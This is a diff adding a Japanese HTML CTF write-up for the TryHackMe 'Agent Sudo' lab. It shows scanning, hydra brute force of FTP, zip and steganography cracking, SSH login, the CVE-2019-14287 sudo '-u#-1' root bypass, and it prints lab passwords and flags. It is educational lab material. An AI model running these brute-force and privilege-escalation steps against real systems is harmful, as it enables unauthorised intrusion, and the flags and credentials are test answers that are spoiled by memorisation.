@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Agent Sudo Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Agent Sudo</h1>
+    <p>User-Agent 列挙、FTP/ステガノ、SSH、CVE-2019-14287 sudo バイパス。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <p><code>-sV -sC -p-</code>を実施した</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ nmap -sV -sC -oX scan.xml -T4 -p- 10.48.153.139
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 13:25 +0900
+Nmap scan report for 10.48.153.139
+Host is up (0.13s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Annoucement
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 111.75 seconds
+</code></pre>
+<p><code>ftp</code>が開いている。この場合にはanonymousログインはできないのだろうか。</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ ftp anonymous@10.48.153.139        
+Connected to 10.48.153.139.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp&gt; ls
+530 Please login with USER and PASS.
+530 Please login with USER and PASS.
+ftp: Can't bind for data connection: アドレスは既に使用中です
+ftp&gt; exit
+221 Goodbye.
+</code></pre>
+<p>できませんでした。<br>
+その他には<code>ssh</code>と<code>http</code>も開いている</p>
+<p>サイトを見ると「エージェントのコードネームを使え」と書かれていた</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ curl http://10.48.153.139                                    
+
+&lt;!DocType html&gt;
+&lt;html&gt;
+&lt;head&gt;
+        &lt;title&gt;Annoucement&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;p&gt;
+        Dear agents,
+        &lt;br&gt;&lt;br&gt;
+        Use your own &lt;b&gt;codename&lt;/b&gt; as user-agent to access the site.
+        &lt;br&gt;&lt;br&gt;
+        From,&lt;br&gt;
+        Agent R
+&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ 
+</code></pre>
+<p>codename使えって言われている<br>
+これはサイトにアクセスする際の「自分はどのブラウザか」を示すUser-Agent情報であると思料<br>
+本問は、「特定のコードネームをUser-Agentに設定してアクセスしてきた時だけ、秘密のページへリダイレクトしてやるぞ」という仕掛けになっていると仮定</p>
+<p><code>curl -A "A" -L http://10.48.153.139</code>のようなコマンドを一文字ずつ試していく</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ curl http://10.48.153.139 -A &quot;A&quot; -L
+
+&lt;!DocType html&gt;
+&lt;html&gt;
+&lt;head&gt;
+        &lt;title&gt;Annoucement&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;p&gt;
+        Dear agents,
+        &lt;br&gt;&lt;br&gt;
+        Use your own &lt;b&gt;codename&lt;/b&gt; as user-agent to access the site.
+        &lt;br&gt;&lt;br&gt;
+        From,&lt;br&gt;
+        Agent R
+&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ curl http://10.48.153.139 -A &quot;B&quot; -L
+
+&lt;!DocType html&gt;
+&lt;html&gt;
+&lt;head&gt;
+        &lt;title&gt;Annoucement&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;p&gt;
+        Dear agents,
+        &lt;br&gt;&lt;br&gt;
+        Use your own &lt;b&gt;codename&lt;/b&gt; as user-agent to access the site.
+        &lt;br&gt;&lt;br&gt;
+        From,&lt;br&gt;
+        Agent R
+&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ curl http://10.48.153.139 -A &quot;C&quot; -L
+Attention chris, &lt;br&gt;&lt;br&gt;
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! &lt;br&gt;&lt;br&gt;
+
+From,&lt;br&gt;
+Agent R
+</code></pre>
+<p>コードネーム<code>C</code>がヒットした</p>
+<p>chrisという名前を得た<br>
+これでsshかftpにブルートフォースを仕掛ける<br>
+<code>hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.48.153.139 -vV</code>をやっているがめちゃくちゃ時間かかる</p>
+<p>20分くらい回して終わりそうになかったので別のアプローチを考える</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.48.153.139 -t 64    
+Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 15:07:48
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ftp://10.48.153.139:21/
+[21][ftp] host: 10.48.153.139   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 15:08:32
+</code></pre>
+<p>このコマンドで回したら一瞬で終わった</p>
+<p><code>history</code>で探してみる</p>
+<pre><code class="language-bash">  737  hydra -l chirs -P /usr/share/wordlists/rockyou.txt ftp://10.48.153.139
+  738  hydra -l chirs -P /usr/share/wordlists/rockyou.txt ftp://10.48.153.139 -vv
+  739  hydra -l chirs -P /usr/share/wordlists/rockyou.txt ftp://10.48.153.139 -vV
+  740  hydra -l chirs -P /usr/share/wordlists/rockyou.txt ftp://10.48.153.139 -vV -t 64
+  741  hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.48.153.139 -t 64
+</code></pre>
+<p>クリスのつづり間違えてただけだった</p>
+<p><code>crystal</code>というパスワードをゲットしたのでログインしていく</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ ftp chris@10.48.153.139 
+Connected to 10.48.153.139.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||58480|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+ftp&gt; get To_agentJ.txt
+local: To_agentJ.txt remote: To_agentJ.txt
+229 Entering Extended Passive Mode (|||7867|)
+150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
+100% |********************************|   217        2.37 MiB/s    00:00 ETA
+226 Transfer complete.
+217 bytes received in 00:00 (1.62 KiB/s)
+ftp&gt; get cute-alien.jpg
+local: cute-alien.jpg remote: cute-alien.jpg
+229 Entering Extended Passive Mode (|||56892|)
+150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
+100% |********************************| 33143      248.79 KiB/s    00:00 ETA
+226 Transfer complete.
+33143 bytes received in 00:00 (124.68 KiB/s)
+ftp&gt; get cutie.png
+local: cutie.png remote: cutie.png
+229 Entering Extended Passive Mode (|||14341|)
+150 Opening BINARY mode data connection for cutie.png (34842 bytes).
+100% |********************************| 34842      261.32 KiB/s    00:00 ETA
+226 Transfer complete.
+34842 bytes received in 00:00 (131.07 KiB/s)
+ftp&gt; exit
+221 Goodbye.
+</code></pre>
+<p>3つくらいのファイルをゲットした</p>
+<p>中身を見る</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ ll
+合計 80
+-rw-rw-r-- 1 rkametani rkametani   217 10月 29  2019 To_agentJ.txt
+-rw-rw-r-- 1 rkametani rkametani 33143 10月 29  2019 cute-alien.jpg
+-rw-rw-r-- 1 rkametani rkametani 34842 10月 29  2019 cutie.png
+-rw-rw-r-- 1 rkametani rkametani  3767  5月 14 13:27 scan.xml
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ cat To_agentJ.txt                  
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ 
+</code></pre>
+<p>picファイルの中にクレデンシャルが入っているらしい</p>
+<p><code>exiftool</code>でファイル解析しようとしたが成果なし</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ exiftool cute-alien.jpg
+ExifTool Version Number         : 13.50
+File Name                       : cute-alien.jpg
+Directory                       : .
+File Size                       : 33 kB
+File Modification Date/Time     : 2019:10:29 21:22:37+09:00
+File Access Date/Time           : 2026:05:14 15:12:02+09:00
+File Inode Change Date/Time     : 2026:05:14 15:12:02+09:00
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 96
+Y Resolution                    : 96
+Image Width                     : 440
+Image Height                    : 501
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 440x501
+Megapixels                      : 0.220
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ exiftool cutie.png     
+ExifTool Version Number         : 13.50
+File Name                       : cutie.png
+Directory                       : .
+File Size                       : 35 kB
+File Modification Date/Time     : 2019:10:29 21:33:51+09:00
+File Access Date/Time           : 2026:05:14 15:12:07+09:00
+File Inode Change Date/Time     : 2026:05:14 15:12:07+09:00
+File Permissions                : -rw-rw-r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 528
+Image Height                    : 528
+Bit Depth                       : 8
+Color Type                      : Palette
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Palette                         : (Binary data 762 bytes, use -b option to extract)
+Transparency                    : (Binary data 42 bytes, use -b option to extract)
+Warning                         : [minor] Trailer data after PNG IEND chunk
+Image Size                      : 528x528
+Megapixels                      : 0.279
+</code></pre>
+<p>つづいて<code>binwalk</code>を試したところ何か出た</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ binwalk cute-alien.jpg 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ binwalk cutie.png     
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+</code></pre>
+<p><code>-e</code>オプションで抽出する</p>
+<pre><code class="language-bash">──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ binwalk cutie.png -e
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+
+WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
+</code></pre>
+<p><code>To_agentR.txt</code>がencryptedされた上でZip化されているよと言われている</p>
+<p>そこで、まずこのzipファイルからパスワードをハッシュ化したものを取り出す作業を行う<br>
+これによりそのハッシュをjohnに投げれば解析できるかもしれなくなる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ cd _cutie.png.extracted 
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo/_cutie.png.extracted]
+└─$ zip2john 8702.zip &gt; zip.hash
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo/_cutie.png.extracted]
+└─$ ls
+365  365.zlib  8702.zip  zip.hash
+
+</code></pre>
+<p><code>zip2john</code>はJohn the Rippterに含まれる補助ツールであり<br>
+zipファイルのパスワード情報をjohnが解析できる形式に変換するツールである</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo/_cutie.png.extracted]
+└─$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
+Cost 1 (HMAC size) is 78 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alien            (8702.zip/To_agentR.txt)     
+1g 0:00:00:00 DONE (2026-05-14 15:35) 5.555g/s 182044p/s 182044c/s 182044C/s christal..eatme1
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo/_cutie.png.extracted]
+└─$ 
+</code></pre>
+<p>それをクラックすれば<code>alien</code>というパスワードを得られたので<code>unzip</code>する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo/_cutie.png.extracted]
+└─$ unzip 8702.zip                     
+Archive:  8702.zip
+   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo/_cutie.png.extracted]
+└─$ 7z x 8702.zip 
+
+7-Zip 26.01 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-04-27
+ 64-bit locale=ja_JP.UTF-8 Threads:4 OPEN_MAX:4096, ASM
+
+Scanning the drive for archives:
+1 file, 280 bytes (1 KiB)
+
+Extracting archive: 8702.zip
+--
+Path = 8702.zip
+Type = zip
+Physical Size = 280
+
+
+Enter password (will not be echoed):
+Everything is Ok
+
+Size:       86
+Compressed: 280
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo/_cutie.png.extracted]
+
+</code></pre>
+<p>今回のように<code>binwalk</code>で抽出したファイルは<code>unzip</code>だとエラーが出ることがあり、その場合には<code>7z</code>を使うとスムーズ<br>
+解凍して得られたものを読んでいく</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo/_cutie.png.extracted]
+└─$ cat To_agentR.txt      
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo/_cutie.png.extracted]
+└─$ 
+</code></pre>
+<p>これは、、、cyberchef案件？</p>
+<p>やってみたところbase64からの変換で<code>Area51</code>を得た<br>
+そういえばさっき<code>steghide</code>もやっていてパスフレーズを求められていた<br>
+<code>cutie.png</code>にはもう用はないと思うので<code>cute-alien.jpg</code>に試そう</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ steghide extract -sf cute-alien.jpg
+Enter passphrase: 
+wrote extracted data to &quot;message.txt&quot;.
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ ls
+To_agentJ.txt         cute-alien.jpg  message.txt
+_cutie.png.extracted  cutie.png       scan.xml
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ 
+</code></pre>
+<p><code>message.txt</code>を得た</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ cat message.txt          
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ 
+</code></pre>
+<p><code>james</code>くんのパスワードが<code>hackerrules</code>であることが得られた</p>
+<p>これで、sshか？←だめだった<br>
+<code>hackerrules</code>じゃなくて<code>hackerrules!</code>らしい。</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ ssh james@10.48.153.139
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+james@10.48.153.139's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu May 14 06:47:24 UTC 2026
+
+  System load:  0.0               Processes:           101
+  Usage of /:   40.1% of 9.78GB   Users logged in:     0
+  Memory usage: 40%               IP address for ens5: 10.48.153.139
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+james@agent-sudo:~$ ls
+Alien_autospy.jpg  user_flag.txt
+james@agent-sudo:~$ cat user_flag.txt 
+b03d975e8c92a7c04146cfa7a5a313c7
+james@agent-sudo:~$ 
+</code></pre>
+<p><code>user_flag.txt</code>を得られた</p>
+<p>つぎの設問を見ると<br>
+「What is the incident of the photo called?」とある<br>
+この写真にまつわる事件の名前を聞かれている？<br>
+ということでサーバー立ててローカルからwgetして取ってきた</p>
+<pre><code class="language-bash">james@agent-sudo:~$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.205.211 - - [14/May/2026 06:56:41] &quot;GET /Alien_autospy.jpg HTTP/1.1&quot; 200 -
+^C
+Keyboard interrupt received, exiting.
+james@agent-sudo:~$ 
+</code></pre>
+<p>これとlocal側でも</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/agentSudo]
+└─$ wget http://10.48.153.139:8000/Alien_autospy.jpg 
+--2026-05-14 15:56:42--  http://10.48.153.139:8000/Alien_autospy.jpg
+10.48.153.139:8000 に接続しています... 接続しました。
+HTTP による接続要求を送信しました、応答を待っています... 200 OK
+長さ: 42189 (41K) [image/jpeg]
+`Alien_autospy.jpg' に保存中
+
+Alien_autospy.jpg   100%[================&gt;]  41.20K   158KB/s 時間 0.3s     
+
+2026-05-14 15:56:42 (158 KB/s) - `Alien_autospy.jpg' へ保存完了 [42189/42189]
+</code></pre>
+<p>とした。<br>
+設問のヒントを見ると<br>
+「Reverse image and Foxnews.」とあるので<br>
+Google画像検索をしてみた。<br>
+表示結果をみるとfoxニュースがあったのでそのページから答えを得た。</p>
+<p>つづいて権限昇格する</p>
+<pre><code class="language-bash">james@agent-sudo:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+james@agent-sudo:~$ 
+</code></pre>
+<p><code>bash</code>をたてられそう</p>
+<pre><code class="language-bash">james@agent-sudo:~$ sudo /bin/bash
+Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.
+james@agent-sudo:~$ 
+</code></pre>
+<p><code>(ALL, !root)</code>の設定を見ると、rootにはなれないよということらしい<br>
+google検索をかけると<code>CVE-2019-14287</code>の脆弱性であることが特定できた<br>
+<code>-u#-1</code>をコマンドに入れるとroot奪取できる</p>
+<pre><code class="language-bash">root@agent-sudo:~# cat /root/root.txt 
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+root@agent-sudo:~# 
+</code></pre>
+<p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/agentsudo">https://tryhackme.com/room/agentsudo</a></p>
+  </footer>
+</body>
+</html>
